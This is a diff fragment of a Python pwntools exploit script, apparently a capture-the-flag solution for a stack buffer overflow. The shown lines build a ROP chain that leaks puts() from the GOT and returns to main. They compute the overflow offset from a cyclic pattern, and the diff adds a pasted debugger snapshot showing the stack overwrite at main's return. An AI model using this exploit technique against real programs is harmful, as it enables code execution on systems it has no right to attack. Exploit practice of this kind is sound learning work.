@@ -37,6 +37,15 @@ rop.call(elf.symbols['main'])
 log.info("ROP 1 - read( puts() from GOT); call main")
 print rop.dump()
 
+"""
+RIP  0x4007e1 (main+245) <-- ret
+[-------------------------------CODE-------------------------------]
+=> 0x4007e1 <main+245>    ret    
+[------------------------------STACK-------------------------------]
+00:0000| rsp  0x7fffffffdaf8 <-- 'naaboaabpaabqaa...'
+"""
+
+
 shellcode = 'B' * (cyclic_find(unhex('6261616f')[::-1]) - 4)
 shellcode += str(rop)
 
